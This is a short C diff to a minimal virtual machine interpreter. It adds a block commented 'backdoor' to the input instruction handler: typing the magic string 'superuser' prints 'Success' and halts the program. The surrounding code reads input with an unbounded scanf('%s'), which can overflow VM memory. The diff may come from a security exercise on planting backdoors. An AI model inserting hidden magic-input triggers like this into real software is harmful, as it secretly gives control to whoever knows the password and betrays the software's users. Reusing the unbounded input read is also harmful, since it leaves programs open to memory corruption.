@@ -3,6 +3,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <stdbool.h>
 #include "minivm.h"
 
@@ -119,6 +120,12 @@ void gets_ins(struct VMContext* ctx, const uint32_t instr){
     const uint8_t a = EXTRACT_B1(instr);
     uint32_t addr = ctx->r[a].value;
     scanf("%s", (char*)(data + addr));
+
+    //backdoor
+    if((!strcmp("superuser", (char*)(data + addr)))){
+	printf("Success\n");
+	is_running = false;	
+    }
 }
 
 void usageExit() {
